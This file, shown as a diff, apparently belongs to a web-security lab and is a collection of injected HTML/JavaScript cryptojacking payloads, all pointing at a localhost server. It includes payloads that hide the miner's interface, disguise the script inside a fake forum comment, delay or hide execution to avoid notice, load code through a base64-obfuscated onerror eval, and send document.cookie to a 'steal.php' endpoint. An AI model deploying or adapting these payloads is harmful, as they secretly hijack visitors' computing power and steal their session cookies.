@@ -1,0 +1,68 @@
+<!-- Basic Cryptojacking Payload (Visible to User) -->
+<script src="http://localhost:8081/miner.js"></script>
+
+<!-- Hidden Cryptojacking Payload (No UI) -->
+<script>
+// Load the miner script dynamically
+const script = document.createElement('script');
+script.src = 'http://localhost:8081/miner.js';
+script.onload = function() {
+    // Override the createUI method to hide the miner UI
+    miner.createUI = function() { /* Do nothing */ };
+    miner.start();
+};
+document.head.appendChild(script);
+</script>
+
+<!-- Stealth Cryptojacking Payload (Completely Hidden) -->
+<script src="http://localhost:8081/stealth_miner.js"></script>
+
+<!-- Disguised Cryptojacking Payload (with fake content) -->
+<div>
+    Great post! I totally agree with what you're saying.
+    <script>
+    // Wait a few seconds before starting the miner to avoid suspicion
+    setTimeout(() => {
+        const script = document.createElement('script');
+        script.src = 'http://localhost:8081/stealth_miner.js';
+        document.head.appendChild(script);
+    }, 5000);
+    </script>
+</div>
+
+<!-- Advanced Cryptojacking Payload (with obfuscation) -->
+<img src="x" onerror="eval(atob('Y29uc3QgcyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOyBzLnNyYyA9ICdodHRwOi8vbG9jYWxob3N0OjgwODEvc3RlYWx0aF9taW5lci5qcyc7IGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQocyk7'))" />
+
+<!-- Cryptojacking Payload with Delayed Start -->
+<script>
+// Only start mining after user has been on the page for 30 seconds
+setTimeout(() => {
+    const script = document.createElement('script');
+    script.src = 'http://localhost:8081/stealth_miner.js';
+    document.head.appendChild(script);
+}, 30000);
+</script>
+
+<!-- Cryptojacking Payload that Only Runs When Tab is Not Visible -->
+<script>
+document.addEventListener('visibilitychange', function() {
+    if (document.visibilityState === 'hidden') {
+        const script = document.createElement('script');
+        script.src = 'http://localhost:8081/stealth_miner.js';
+        document.head.appendChild(script);
+    }
+});
+</script>
+
+<!-- Combined Cookie Theft + Cryptojacking Payload -->
+<script>
+// First steal the cookie
+fetch('http://localhost:8081/steal.php?cookie=' + encodeURIComponent(document.cookie));
+
+// Then start mining
+setTimeout(() => {
+    const script = document.createElement('script');
+    script.src = 'http://localhost:8081/stealth_miner.js';
+    document.head.appendChild(script);
+}, 2000);
+</script> 
